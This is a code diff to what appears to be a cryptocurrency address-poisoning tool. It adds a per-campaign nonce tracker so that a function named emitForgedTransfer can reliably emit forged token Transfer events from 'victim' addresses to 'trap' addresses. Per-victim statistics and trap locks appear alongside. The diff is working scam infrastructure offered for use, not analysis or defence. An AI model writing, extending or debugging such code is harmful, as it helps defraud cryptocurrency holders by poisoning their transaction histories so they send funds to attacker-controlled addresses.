@@ -410,6 +410,37 @@ const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);
 const processedTxHashes = new Map();
 const trapLocks = new Map();
 
+// 🚀 FIX: Local Nonce Tracker to prevent RPC load balancer race conditions
+const campaignNonces = new Map();
+
+async function getAndIncrementNonce(campaignId, walletClient, address) {
+  if (!campaignNonces.has(campaignId)) {
+    campaignNonces.set(campaignId, new Map());
+  }
+  const nonces = campaignNonces.get(campaignId);
+
+  // Fetch from RPC only on the very first transaction for this campaign
+  if (!nonces.has(address)) {
+    try {
+      const rpcNonce = await walletClient.getTransactionCount({ address, blockTag: 'pending' })
+        .catch(() => walletClient.getTransactionCount({ address }));
+      nonces.set(address, rpcNonce);
+    } catch (err) {
+      logger.warn(`[mirror] Failed to fetch initial nonce: ${err.message}`);
+      nonces.set(address, 0);
+    }
+  }
+
+  return nonces.get(address);
+}
+
+function confirmNonceIncrement(campaignId, address) {
+  const nonces = campaignNonces.get(campaignId);
+  if (nonces && nonces.has(address)) {
+    nonces.set(address, nonces.get(address) + 1);
+  }
+}
+
 // --- Per‑victim statistics ---
 const victimStats = new Map();
 const victimTxTimestamps = new Map();
@@ -894,12 +925,21 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // ═══════════════════════════════════════════════════════
     // ACTUAL TRANSACTION: Emit forged Transfer event
     // ═══════════════════════════════════════════════════════
+
+    // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
+    const nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
+
     const hash = await walletClient.writeContract({
       address: contractAddress,
       abi: MIRROR_TOKEN_ABI,
       functionName: 'transferFrom',
       args: [victimAddress, trapAddress, rawValue],
+      nonce: nonce, // <--- EXPLICIT NONCE
     });
+
+    // Only increment AFTER successful send to RPC (prevents gaps if tx fails to send)
+    confirmNonceIncrement(campaignId, operatorAddress);
+
     logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
     return hash;
   }).catch(err => {
